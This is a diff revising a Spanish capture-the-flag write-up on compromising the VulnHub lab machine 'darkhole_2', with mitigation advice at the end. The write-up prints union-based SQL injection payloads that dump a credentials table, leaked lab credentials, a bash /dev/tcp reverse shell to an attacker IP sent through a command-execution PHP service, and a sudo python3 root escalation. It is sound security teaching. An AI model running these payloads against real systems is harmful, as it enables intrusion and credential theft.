@@ -17,11 +17,10 @@ related:
 references:
   - https://www.vulnhub.com/entry/darkhole-2,740/
 ---
-> [!INFO] Información General
+# CTF: Darkhole_2
+![[cover.png]] 
+>[!INFO] Información General
 >Aquí encontrarás un Writeup de como hackear la máquina "darkhole_2" de VulnHub. A lo largo de la cual aprenderás a como funcionan diversos ataques de inyección SQL, en que consiste la enumeración básica de subdominios y nos aprovecharemos de un servicios expuesto bajo el puerto 9999 para realizar una escalada de privilegios.
-
-![[cover.png]]
-
 ---
 ## Objetivo
 
@@ -29,31 +28,29 @@ references:
 - Obtener acceso inicial mediante enumeración web.
 - Escalar privilegios hasta root mediante abuso de servicios locales.
 - Capturar las flags user.txt y root.txt
+## Herramientas y Comandos Recomendados
 
----
-## Preparativos:
-- Máquina Virtual en VMWare.
-### Pistas:
-- El repositorio Git contenía 3 commits; solo el segundo contenía credenciales
-- La tabla ssh en la BD estaba específicamente diseñada para almacenar creds de acceso remoto
-- El servicio PHP en puerto 9999 no requería autenticación ni validaba comandos
-- El usuario losy tenía contraseña débil y permisos sudo peligrosos
+| Herramienta | Función principal                             |
+| ----------- | --------------------------------------------- |
+| arp-scan    | Descubre hosts en la red.                     |
+| nmap        | Escaneo y enumeración de puertos y servicios. |
+| wget        | Descarga de archivos desde la web.            |
+| git         | Control de versiones de código.               |
+| Burp Suite  | Análisis y pruebas de tráfico web.            |
+| curl        | Transferencia de datos y pruebas HTTP.        |
+| netcat      | Utilidad multipropósito de red.               |
+| ssh         | Acceso remoto seguro por consola.             |
+| htop        | Monitorización avanzada de procesos.          |
+| netstat     | Revisión de conexiones y puertos activos.     |
+> [!TIP] Preparativos Personales:  
+>Esta máquina vulnerable fue ejecutada bajo un entorno virtualizado usando **VMware Workstation** sobre un sistema operativo **Arch Linux**. Todas las herramientas fueron descargadas e instaladas de los repositorios oficiales o desde la **AUR**. 
 
 ---
 # Informe General:
 
 > [!Abstract] Resumen Técnico
-> Se obtuvo acceso inicial mediante credenciales hardcodeadas extraídas de commits de Git expuestos en la aplicación web, esto llevó a una explotación de una inyección SQL manual (Burp Suite) en el parámetro "id" del dashboard. Esto permitió obtener credenciales SSH del usuario "jehad". La escalada de privilegios se logró abusando de un servicio PHP interno ejecutándose como el usuario "losy" bajo el puerto 9999, seguido de una explotación de permisos para ejecutar Python como root y lograr una shell sin limites.
----
-## Información y Reconocimiento
-
-### Alcance:
-- Host objetivo: 
-	- Máquina virtual: darkhole_2 en red local `vmnet1`
-- Restricciones: 
-	- Entorno de laboratorio local, sin restricciones.
-
-### I. Identificación del Target
+> Se obtuvo acceso inicial mediante credenciales extraídas de commits de Git expuestos en la aplicación web, esto llevó a una explotación de inyección SQL (Burp Suite) en el parámetro "id" de la URL del dashboard. Esto permitió obtener credenciales SSH del usuario "jehad", admitiendo así una escalada de privilegios. Esto se logró abusando de un servicio PHP interno ejecutándose como el usuario "losy" en el usuario "jehad" bajo el puerto 9999, seguido de una explotación de permisos para ejecutar Python como root y **lograr una shell sin limites**.
+## I. Identificación del Target
 
 Lo primero que debemos hacer es la fase de reconocimiento, esto es indispensable para trazar el mapa de la infraestructura objetivo y saber exactamente a que nos estamos enfrentando. Casi siempre tu primer paso será determinar la dirección IP de la máquina objetivo, en mi caso será la maquina "`darkhole_2`" ubicada en mi red local (`vmnet1`).
 
@@ -92,21 +89,20 @@ Parámetros:
 
 Resultados resumidos:
 
-| Puerto | Protocolo | Servicio     | Versión                 | Observaciones                     |
-| :----: | :-------: | :----------- | :---------------------- | :-------------------------------- |
-| 22/tcp |    SSH    | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.3 | Potencial acceso remoto con creds |
-| 80/tcp |   HTTP    | Apache httpd | 2.4.41 (Ubuntu)         | Aplicación web "DarkHole V2"      |
+| Puerto | Protocolo | Servicio     | Versión                 | Observaciones               |
+| :----: | :-------: | :----------- | :---------------------- | :-------------------------- |
+| 22/tcp |    SSH    | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.3 | Potencial acceso remoto     |
+| 80/tcp |   HTTP    | Apache httpd | 2.4.41 (Ubuntu)         | Aplicación web: DarkHole V2 |
 
 ### Puerto 80 - Análisis HTTP
 
 Un puerto 80 abierto normalmente quiere decir que el servidor está hosteando un servicio Web. Esto quiere decir que si entramos al navegador y colocamos la IP seguramente encontremos una página web.
 
-Confirmación de Puerto 80 abierto:
+Confirmación de Puerto 80 abierto en reporte de nmap:
 ```
 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
 ```
-
-![[darkhole_2.3.png]]
+![[darkhole_2.3.png.png]]
 	Se identifica una aplicación web activa con TTL de 64 (indicador de sistema Linux) y servidor Apache httpd 2.4.41 corriendo sobre Sistema Ubuntu.
 
 ### Puerto 22 - SSH
@@ -130,13 +126,12 @@ Los scripts básicos de reconocimiento de nmap revelaron información crítica:
 |     Repository description: Unnamed repository; edit this file 'description' to name the..
 |_    Last commit message: i changed login.php file for more secure
 ```
-
 > [!warning] Repositorio Git Expuesto
 > Se detectó un directorio .git accesible públicamente en http://172.16.23.128/.git/ con commits históricos potencialmente sensibles.
-> 
+
 ![[darkhole_2.4.png]]
 
-Siempre que encuentres algún directorio de git en ulgún proyecto puede valer la penar echarle un ojo a lo contiene, puede que haya guardado/borrado información sensibles y es justo lo que vamos a averiguar. Para ellos hay varias formas de hacerlo, yo procederé a descargar el repositorio completo para un análisis forense:
+Siempre que encuentres algún directorio de Git en un proyecto, puede valer la pena revisarlo para ver qué contiene. Es posible que hayan guardado o borrado información sensible, y esa es exactamente la información que buscamos descubrir. Existen varias formas de hacerlo, y en esta ocasión, procederé a descargar el repositorio completo para realizar un análisis forense detallado.
 
 Comando para descargar repositorio:
 ```
@@ -146,7 +141,7 @@ wget -r http://172.16.23.128/.git/
 	Descargamos con éxito el proyecto y podemos ver su contenido.
 ### Análisis de Commits Git
 
-Como queremos ver si hay información sensible dentro del proyecto solo debemos ver un log del mismo, cosa que se puede hacer de forma muy sencilla.
+Como queremos ver si hay información sensible dentro del proyecto solo debemos ver los logs del mismo, cosa que se puede hacer de forma muy sencilla.
 
 Comando para revisar logs:
 ```
@@ -184,8 +179,7 @@ Resultados:
 ```
 
 Se confirma el subdominio "/login.php" mencionado en el commit.
-
-![[darkhole_2.8.png]]
+![[8.png]]
 	Tenemos una Login page, la cual seguramente tiene que ver con las credenciales anteriormente mencionadas. 
 ### Leak de Credenciales en Git
 
@@ -197,8 +191,8 @@ git show a4d900a8d85e8938d3601f3cef113ee293028e10
 ```
 ![[darkhole_2.9.png]]
 
-> [!danger] Credenciales Hardcodeadas Expuestas
-> El commit reveló credenciales de administrador embebidas en el código fuente del archivo login.php. Dando así paso al 2do ataque.
+> [!danger] Credenciales Expuestas
+> El commit reveló credenciales de **administrador** embebidas en el código fuente del archivo **login.php**.
 
 Fragmento del código encontrado:
 ```
@@ -215,10 +209,8 @@ Fragmento del código encontrado:
 Credenciales obtenidas:
 - Email: lush@admin.com
 - Password: 321
-
 ---
-
-## Acceso Inicial (Explotación)
+## II. Acceso Inicial (Explotación)
 
 ### Identificación de la Vulnerabilidad
 
@@ -233,8 +225,7 @@ El dashboard presenta un parámetro id en la URL susceptible a inyección SQL.
 ### Explotación con Burp Suite
 
 ![[darkhole_2.11.png]]
-
-Se interceptó la petición GET con Burp Suite y se activó el modo Repeater para pruebas de SQLi manual.
+	Se interceptó la petición GET con Burp Suite y se activó el modo Repeater para pruebas de SQLi manual.
 
 #### Proceso de Inyección SQL
 
@@ -244,10 +235,8 @@ Solicitud modificada:
 ```
 GET /dashboard.php?id=2 HTTP/1.1
 ```
-
 ![[darkhole_2.12.png]]
-
-Respuesta: 200 OK. Se accedió al perfil de otro usuario con campos vacíos.
+	Respuesta: 200 OK. Se accedió al perfil de otro usuario con campos vacíos.
 
 **Paso 2 - Conteo de columnas:**
 
@@ -264,10 +253,8 @@ Solicitud modificada:
 ```
 GET /dashboard.php?id=2'+union+select+1,2,3,4,5,6--+- HTTP/1.1
 ```
-
 ![[darkhole_2.13.png]]
-
-Los campos 2, 3, 5 y 6 son inyectables y se muestran en la respuesta.
+	Los campos 2, 3, 5 y 6 son inyectables y se muestran en la respuesta.
 
 **Paso 4 - Enumeración de bases de datos:**
 
@@ -275,10 +262,8 @@ Solicitud modificada:
 ```
 GET /dashboard.php?id=2'+union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+- HTTP/1.1
 ```
-
 ![[darkhole_2.14.png]]
-
-Bases de datos identificadas: mysql, information_schema, performance_schema, sys, darkhole_2 (objetivo).
+	Bases de datos identificadas: mysql, information_schema, performance_schema, sys, darkhole_2.
 
 **Paso 5 - Enumeración de tablas en darkhole_2:**
 
@@ -287,8 +272,7 @@ Solicitud modificada:
 GET /dashboard.php?id=2'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema%3d'darkhole_2'--+- HTTP/1.1
 ```
 ![[darkhole_2.15.png]]
-
-Tablas identificadas: ssh, users.
+	Tablas identificadas: ssh, users.
 
 **Paso 6 - Enumeración de columnas en tabla ssh:**
 
@@ -321,74 +305,74 @@ ssh jehad@172.16.23.128
 	Acceso exitoso a la máquina como usuario jehad.
 
 ---
-
-## Post-Explotación y Privesc
+## III. Post-Explotación y Privesc
 
 ### Enumeración Interna
 
 **Inventario del sistema:**
 
 Comando para ver kernel:
-
+```
 uname -a
-
-Resultado: Linux darkhole 5.4.0-81-generic 91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
+```
+![[darkhole_2.34.png]]
+	Resultado: Linux darkhole 5.4.0-81-generic 91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
 
 Comando para ver versión del SO:
-
+```
 cat /etc/os-release
-
-Resultado: Ubuntu 20.04.3 LTS (Focal Fossa)
+```
+![[darkhole_2.33.png]]
+	Resultado: Ubuntu 20.04.3 LTS (Focal Fossa)
 
 Comando para verificar privilegios sudo:
-
+```
 sudo -l
-
-Resultado: El usuario jehad no tiene permisos sudo.
+```
+![[darkhole_2.32.png]]
+	Resultado: El usuario jehad no tiene permisos sudo.
 
 Comando para ver grupos:
-
+```
 id
-
-Resultado: jehad no pertenece a grupos privilegiados.
+```
+![[darkhole_2.31.png]]
+	Resultado: jehad no pertenece a grupos privilegiados.
 
 Comando para listar usuarios:
-
+```
 cat /etc/passwd
-
-Usuarios con bash: root (UID 0), lama (UID 1000), jehad (UID 1001), losy (UID 1002).
+```
+![[darkhole_2.30.png]]
+	Usuarios con bash: root (UID 0), lama (UID 1000), jehad (UID 1001), losy (UID 1002).
 
 Comando para ver historial:
-
+```
 history
-
+```
 ![[darkhole_2.19.png]]
+	Comandos críticos del historial:
+	1. cd /home/losy
+	2. cd /opt/web
+	3. curl "http://localhost:9999/?cmd=id"
+	4. ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
 
-Comandos críticos en el historial:
-- cd /home/losy
-- cd /opt/web
-- curl "http://localhost:9999/?cmd=id"
-- ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
-
-> [!tip] Servicio Interno Detectado
-> Existe un servicio web interno en puerto 9999 con capacidad de ejecución remota de comandos.
+> [!tip] ¡Servicio Interno Detectado!
+> Gracias a los comandos ejecutados por el usuarios podemos entender que existe un servicio web interno en puerto 9999 con capacidad de ejecución remota de comandos.
 
 Comando para listar puertos en escucha:
-
+```
 netstat -tulpn
-
+```
 ![[darkhole_2.20.png]]
-
-Confirmación: servicio en LISTEN en puerto 9999.
+	Confirmación: servicio en **LISTEN** bajo puerto 9999.
 
 Comando para ver procesos:
 ```
 htop
 ```
-
 ![[darkhole_2.21.png]]
-
-El servicio corre como usuario losy, servidor PHP ubicado en /opt/web.
+	El servicio corre como usuario losy, servidor PHP ubicado en /opt/web.
 
 Comandos para revisar el script PHP:
 ```
@@ -396,8 +380,7 @@ cd /opt/web
 cat index.php
 ```
 ![[darkhole_2.22.png]]
-
-Script PHP simple para ejecución remota de comandos vía parámetro cmd.
+	Script PHP simple para ejecución remota de comandos vía parámetro cmd.
 
 ### Vector de Escalada
 
@@ -411,10 +394,8 @@ Prueba de concepto con curl:
 ```
 curl "http://localhost:9999/?cmd=id"
 ```
-
 ![[darkhole_2.24.png]]
-
-El comando se ejecuta como usuario losy, confirmando RCE.
+	El comando se ejecuta como usuario losy, confirmando RCE.
 
 #### Reverse Shell como losy
 
@@ -422,29 +403,35 @@ Listener en máquina atacante:
 ```
 nc -lvnp 443
 ```
-
 ![[darkhole_2.25.png]]
+	Nos podemos en escucha para recibir la señal que vamos a enviar desde el servicio PHP.
 
-Payload desde consola de jehad (URL encoded):
+Para mandar el payload lo debemos hacer en formato "URL Encode". Les dejo un ejemplo de como se vería el comando de forma "normal" y "URL Encoded".
+
+Comando original:
+```
+curl "http://localhost:9999/?cmd=bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
+```
+
+URL Encoded:
 ```
 curl "http://localhost:9999/?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'"
 ```
-
 ![[darkhole_2.26.png]]
 	Shell inversa obtenida como losy.
 
+> [!WARNING] Advertencia  
+> Una vez establecida la conexión remota mediante netcat, la terminal puede no estar completamente operativa para la interacción directa. Por ello, es recomendable ejecutar un proceso de estabilización antes de continuar con la auditoría, asegurando así un entorno de trabajo más estable y funcional.
 #### Estabilización de TTY
 
 Comandos para estabilizar la shell:
-
 ```
 /usr/bin/script -qc /bin/bash /dev/null
 ```
-	Luego CTRL+Z y ejecutar:
+Luego CTRL+Z y ejecutar:
 ```
 stty raw -echo; fg
 ```
-
 Finalmente:
 ```
 export TERM=xterm
@@ -462,45 +449,33 @@ history
 > 1. sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
 > 2. sudo python3 -c 'import os; os.system("/bin/sh")'
 > 3. P0assw0rd losy:gang (credenciales expuestas)
-
-El usuario losy tiene permisos sudo para ejecutar Python como root.
+> 
+> Esto nos confirma que el usuario losy tiene permisos sudo para ejecutar Python como root bajo la credencial "gang".
 
 ### Escalada a Root
-
-![[darkhole_2.0.png]]
-
 Comando para obtener shell root:
-
 ```
 sudo python3 -c 'import os; os.system("/bin/sh")'
 ```
-	Contraseña usada: gang
-
-Shell de root obtenida. Flag root.txt capturada en /root.
+![[darkhole_2.0.png]]
+	Shell de root obtenida. Flag root.txt capturada en directorio /root.
 
 ---
-
 ## Evidencias
-
-Comando whoami ejecutado como root:
-
-root
-
-Comando hostname:
-
-darkhole
+1. Comando `whoami` y hostname ejecutado como root:
+	![[darkhole_2.35.png]]
 
 Flags capturadas:
-- user.txt: [capturada en /home/]
-- root.txt: [capturada en /root/]
+- user.txt: `capturada en /home/`.
+- root.txt: `capturada en /root/`.
 
 > [!tip] Buenas prácticas de evidencia
-> Todos los comandos, payloads y respuestas del servidor fueron documentados con capturas de pantalla y timestamps para reproducibilidad.
+> Todos los comandos, payloads y respuestas del servidor fueron documentados con capturas de pantalla para su reproducibilidad.
 
 ---
 ## Mitigación y Recomendaciones
 
-**Repositorio Git expuesto:** Eliminar completamente el directorio .git de servidores en producción o bloquear el acceso mediante .htaccess. Nunca commitear credenciales en código fuente; usar variables de entorno o gestores de secretos.
+**Repositorio Git expuesto:** Eliminar completamente el directorio .git de servidores en producción o bloquear el acceso mediante .htaccess. Nunca commitear credenciales en código fuente; usar variables de entorno o Password Managers.
 
 **Inyección SQL:** Implementar consultas preparadas (prepared statements) en todas las interacciones con la base de datos. Validar y sanitizar todas las entradas del usuario mediante whitelists. Aplicar principio de mínimo privilegio en cuentas de base de datos.
 
@@ -519,63 +494,6 @@ Flags capturadas:
 
 > [!note] Mapa mental
 > Técnicas relacionadas: [[Git-Enumeration]], [[SQLi-Manual]], [[SQLi-Union-Based]], [[Linux-Internal-Services]], [[Python-Sudo-Privesc]], [[SSH-Lateral-Movement]]
-
----
-## Herramientas Utilizadas
-
-- arp-scan
-- nmap
-- wget
-- git
-- Burp Suite (Repeater)
-- curl
-- netcat
-- ssh
-- htop
-- netstat
-
----
-
-## Anexos
-
-### Payloads SQLi Utilizados
-
-Enumeración de columnas:
-2'+order+by+6--+-
-
-Union select básico:
-2'+union+select+1,2,3,4,5,6--+-
-
-Extracción de bases de datos:
-2'+union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+-
-
-Extracción de tablas:
-2'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema='darkhole_2'--+-
-
-Extracción de columnas:
-2'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema='darkhole_2'+and+table_name='ssh'--+-
-
-Dump de credenciales:
-2'+union+select+1,2,group_concat(id,0x3a,user,0x3a,pass),4,5,6+from+darkhole_2.ssh--+-
-
-### Reverse Shell Payload
-
-Comando original:
-bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
-
-URL encoded:
-bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'
-
-### Comandos de Estabilización TTY
-
-/usr/bin/script -qc /bin/bash /dev/null
-
-Luego CTRL+Z
-
-stty raw -echo; fg
-export TERM=xterm
-export SHELL=bash
-stty rows 38 columns 116
 
 ---
 
